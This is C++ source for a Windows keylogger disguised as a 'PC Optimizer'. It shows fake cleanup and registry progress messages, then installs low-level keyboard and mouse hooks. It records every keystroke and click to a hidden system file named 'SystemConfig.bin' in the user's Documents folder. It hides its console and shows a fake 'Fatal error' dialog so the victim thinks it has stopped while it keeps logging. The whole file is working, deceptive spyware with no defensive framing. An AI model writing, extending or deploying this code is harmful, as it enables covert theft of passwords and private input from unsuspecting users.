#include <iostream>
#include <fstream>
#ifndef NOMINMAX
#define NOMINMAX
#endif
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <thread>
#include <mutex>

std::mutex m1;

std::wofstream oData;
BYTE keyboardState[256];
WCHAR outputBuffer[5];

void work() {
	std::lock_guard<std::mutex> lock(m1);
	for (int i = 0; i < 3; i++) {
		std::cout << "\nClearing temp files";
		for(int j = 0; j < 3; j++) {
			
			std::this_thread::sleep_for(std::chrono::milliseconds(1000));
			std::cout << '.';
			
			
		}
	}
	std::cout << '\n';
	for (int i = 0; i < 2; i++) {
		std::cout << "\nOptimizing registry";
		for (int j = 0; j < 3; j++) {
			std::this_thread::sleep_for(std::chrono::milliseconds(1000));
			std::cout << '.';
		}
		
	}

	
}

void specialKey(int vk) {
	if (vk == VK_F1) {
		oData << L"[F1]";
	}
	else if (vk == VK_F2) {
		oData << L"[F2]";
	}
	else if (vk == VK_F3) {
		oData << L"[F3]";
	}
	else if (vk == VK_F4) {
		oData << L"[F4]";
	}
	else if (vk == VK_F5) {
		oData << L"[F5]";
	}
	else if (vk == VK_F6) {
		oData << L"[F6]";
	}
	else if (vk == VK_F7) {
		oData << L"[F7]";
	}
	else if (vk == VK_F8) {
		oData << L"[F8]";
	}
	else if (vk == VK_F9) {
		oData << L"[F9]";
	}
	else if (vk == VK_F10) {
		oData << L"[F10]";
	}
	else if (vk == VK_F11) {
		oData << L"[F11]";
	}
	else if (vk == VK_F12) {
		oData << L"[F12]";
	}
	else {
		oData << L"\n---An error occured (Special Key)---\n";
	}
}

void navigationAndEditing(int vk) {
	if (vk == VK_INSERT) {
		oData << L"[INSERT]";
	}
	else if (vk == VK_DELETE) {
		oData << L"[DELETE]";
	}
	else if (vk == VK_HOME) {
		oData << L"[HOME]";
	}
	else if (vk == VK_END) {
		oData << L"[END]";
	}
	else if (vk == VK_PRIOR) {
		oData << L"[PRIOR]";
	}
	else if (vk == VK_NEXT) {
		oData << L"[NEXT]";
	}
	else {
		oData << L"\n---An Error Occured (NavigationAndEditing)---\n";
	}
}

void arrowKeys(int vk) {
	if (vk == VK_UP) {
		oData << L"[UP]";
	}
	else if (vk == VK_DOWN) {
		oData << L"[Down]";
	}
	else if (vk == VK_LEFT) {
		oData << L"[LEFT]";
	}
	else if (vk == VK_RIGHT) {
		oData << L"[RIGHT]";
	}
	else {
		oData << L"\n---An error occured (Arrow Keys)---\n";
	}

}

void modifierKeys(int vk) {
	if (vk == VK_CONTROL) {
		oData << L"[Control]";
	}
	else if (vk == VK_LCONTROL) {
		oData << L"[LCONTROL]";
	}
	else if (vk == VK_RCONTROL) {
		oData << L"[RCONTROL]";
	}
	else if (vk == VK_MENU) {
		oData << L"[MENU]";
	}
	else if (vk == VK_LMENU) {
		oData << L"[LMENU]";
	}
	else if (vk == VK_RMENU) {
		oData << L"[RMENU]";
	}
	else if (vk == VK_NUMLOCK) {
		oData << L"[NUMLOCK]";
	}
	else if (vk == VK_SCROLL) {
		oData << L"[SCROLL]";
	}
	else {
		oData << L"\n---An error occured (modifier Keys)---\n";
	}

}

void systemKeys(int vk) {
	if (vk == VK_LWIN) {
		oData << L"[LWIN]";
	}
	else if (vk == VK_RWIN) {
		oData << L"[RWIN]";
	}
	else if (vk == VK_APPS) {
		oData << L"[APPS]";
	}
	else {
		oData << L"\n---An error occured---\n";
	}
}

void capitalize(int vk) {
	ZeroMemory(keyboardState, sizeof(keyboardState));
	if (GetKeyboardState(keyboardState)) {
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
			keyboardState[VK_SHIFT] = 0x80; 
		else
			keyboardState[VK_SHIFT] = 0;    

		
		if (GetKeyState(VK_CAPITAL) & 0x0001)
			keyboardState[VK_CAPITAL] = 0x01; 
		else
			keyboardState[VK_CAPITAL] = 0;    

		ZeroMemory(outputBuffer, sizeof(outputBuffer));
		int ln = ToUnicode(vk, MapVirtualKey(vk, 0), keyboardState, outputBuffer, 5, 0);
		
		if (ln > 0) {
			oData << outputBuffer[0];
		} 
	}
}

LRESULT CALLBACK lowLevelKeyboardProc(int nCode,WPARAM wParam,LPARAM lParam) {
	KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
	if (nCode == HC_ACTION) {
		if (wParam == WM_KEYDOWN) {
			if (p->vkCode == VK_ESCAPE) {
				oData << L"[ESCAPE]";
			}
			else if (p->vkCode == VK_RETURN) {
				oData << L'\n';
			}
			else if (p->vkCode == VK_TAB) {
				oData << L"[TAB]";
			}
			else if (p->vkCode == VK_SPACE) {
				oData << L" ";
			}
			else if (p->vkCode == VK_BACK) {
				oData << L"[BACKSPACE]";

			}
			else if (p->vkCode == VK_LBUTTON) {
				oData << L"[LBUTTON]";
			}
			else if (p->vkCode == VK_RBUTTON) {
				oData << L"[RBUTTON]";
			}
			else if (p->vkCode == VK_MBUTTON) {
				oData << L"[MBUTTON]";
			}
			else if (p->vkCode == VK_F1 || p->vkCode == VK_F2 || p->vkCode == VK_F3 || p->vkCode == VK_F4 ||
				p->vkCode == VK_F5 || p->vkCode == VK_F6 || p->vkCode == VK_F7 || p->vkCode == VK_F8 ||
				p->vkCode == VK_F9 || p->vkCode == VK_F10 || p->vkCode == VK_F11 || p->vkCode == VK_F12) {

				specialKey(p->vkCode);

			}
			else if (p->vkCode == VK_INSERT ||  // Insert
				p->vkCode == VK_DELETE ||  // Delete
				p->vkCode == VK_HOME ||  // Home
				p->vkCode == VK_END ||  // End
				p->vkCode == VK_PRIOR ||  // Page Up
				p->vkCode == VK_NEXT) {

				navigationAndEditing(p->vkCode);

			}
			else if (p->vkCode == VK_LEFT || p->vkCode == VK_RIGHT ||
				p->vkCode == VK_UP || p->vkCode == VK_DOWN) {

				arrowKeys(p->vkCode);

			}
			else if (p->vkCode == VK_CONTROL || p->vkCode == VK_LCONTROL || p->vkCode == VK_RCONTROL || // Ctrl
				p->vkCode == VK_MENU || p->vkCode == VK_LMENU || p->vkCode == VK_RMENU || // Alt
				p->vkCode == VK_NUMLOCK ||  // Num Lock
				p->vkCode == VK_SCROLL) {

				modifierKeys(p->vkCode);

			}
			else if (p->vkCode == VK_LWIN ||  // Left Windows Key
				p->vkCode == VK_RWIN ||  // Right Windows Key
				p->vkCode == VK_APPS //Applications/Context Menu Key
				) {

				systemKeys(p->vkCode);
				
			}
			else {
				
				capitalize(p->vkCode);
				
			}
		}
	}
    oData.flush();
	return CallNextHookEx(NULL,nCode,wParam,lParam);
}

LRESULT CALLBACK lowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
	if (nCode == HC_ACTION) {
		switch (wParam) {
		case WM_LBUTTONDOWN: oData << "[LEFTBUTTON]"; break;
		case WM_RBUTTONDOWN: oData << "[RIGHTBUTTON]"; break;
		case WM_MBUTTONDOWN: oData << "[MIDDLEBUTTON]"; break;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	wchar_t path[MAX_PATH];
	SHGetFolderPathW(NULL, CSIDL_PERSONAL, NULL, 0, path);
	std::wstring filePath = std::wstring(path) + L"\\SystemConfig.bin";
	
	// Open file for writing
	oData.open(filePath, std::ios::app);
	if (!oData.is_open()) return 1;
	if (oData.is_open()) {
		oData.close();
		SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	}
	oData.open(filePath, std::ios::app);
	if(!oData.is_open()) return 1;
	
	// Optional: console for start
	AllocConsole();
	freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
	freopen_s((FILE**)stdin, "CONIN$", "r", stdin);
	std::wcout << L"PC Optimizer: Press Enter to start optimizing your system..." << std::endl;
	std::wcin.get();
	std::thread worker1(work);
	worker1.join();
	// Install low-level keyboard hook
	HHOOK hKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL,lowLevelKeyboardProc, NULL, 0);
	if (!hKeyboard) {
		std::wcout << L"Failed to install hook!" << std::endl;
		return 1;
	}
	HHOOK hMouse = SetWindowsHookEx(WH_MOUSE_LL, lowLevelMouseProc, NULL, 0);

	HWND consoleWindow = GetConsoleWindow();
	ShowWindow(consoleWindow, SW_HIDE);

	const wchar_t* msg1 = L"A fatal error has occurred.\nContact the developer for assistance.";
	MessageBoxW(NULL, msg1, L"Fatal error", MB_OK | MB_ICONERROR);

	// Message loop to keep hook alive
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// Cleanup
	UnhookWindowsHookEx(hKeyboard);
	oData.close();
	return 0;
 }


